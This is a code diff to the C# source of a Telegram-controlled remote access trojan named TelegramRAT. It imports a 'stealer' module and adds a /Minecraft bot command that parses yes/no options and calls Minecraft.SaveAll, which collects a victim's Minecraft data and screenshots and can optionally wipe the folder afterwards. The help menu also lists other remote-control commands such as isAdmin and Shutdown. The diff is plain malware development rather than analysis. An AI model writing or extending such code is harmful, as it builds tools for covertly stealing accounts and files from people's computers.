@@ -24,6 +24,7 @@ using System.Windows.Forms;
 using SimpleJSON;
 using Microsoft.Win32;
 using TelegramRAT.modded;
+using TelegramRAT.modded.stealer;
 
 namespace TelegramRAT
 {
@@ -171,6 +172,7 @@ namespace TelegramRAT
                             "\n /ScreenResolution" +
                             "\n /isAdmin" +
                             "\n /BugReport <Title> <MessageText>" +
+                            "\n /Minecraft <SaveScreenshots (yes or no)> and <CleanFolderAfterCollecting (yes or no)>" +
                             "\n" +
                             "\n💡 POWER:" +
                             "\n /Shutdown" +
@@ -1796,6 +1798,56 @@ namespace TelegramRAT
                         }
                         break;
                     }
+                case "MINECRAFT":
+                    {
+                        string saveScreenshots, cleanFolderAfterCollecting;
+                        // Check if args exists
+                        try
+                        {
+                            saveScreenshots = args[1].ToLower();
+                            cleanFolderAfterCollecting = args[2].ToLower();
+                        }
+                        catch (IndexOutOfRangeException)
+                        {
+                            telegram.sendText("⛔ Argument <SaveScreenshots (yes or no)> and <CleanFolderAfterCollecting (yes or no)> are required for /Minecraft");
+                            break;
+                        }
+
+                        bool saveScreenshotsB, cleanFolderAfterCollectingB;
+
+                        if (!TryParseYesNoArgument(saveScreenshots, out saveScreenshotsB))
+                        {
+                            telegram.sendText("⛔ Wrong argument for SaveScreenshots, try again!");
+                            break;
+                        }
+
+                        if (!TryParseYesNoArgument(cleanFolderAfterCollecting, out cleanFolderAfterCollectingB))
+                        {
+                            telegram.sendText("⛔ Wrong argument for CleanFolderAfterCollecting, try again!");
+                            break;
+                        }
+
+                        Minecraft.SaveAll(saveScreenshotsB, cleanFolderAfterCollectingB);
+                        break;
+                    }
+
+                    // Helper method to parse "yes" or "no" argument
+                    bool TryParseYesNoArgument(string argument, out bool result)
+                    {
+                        switch (argument)
+                        {
+                            case "yes":
+                                result = true;
+                                return true;
+                            case "no":
+                                result = false;
+                                return true;
+                            default:
+                                result = false;
+                                return false;
+                        }
+                    }
+
                 // Unknown command
                 default:
                     {
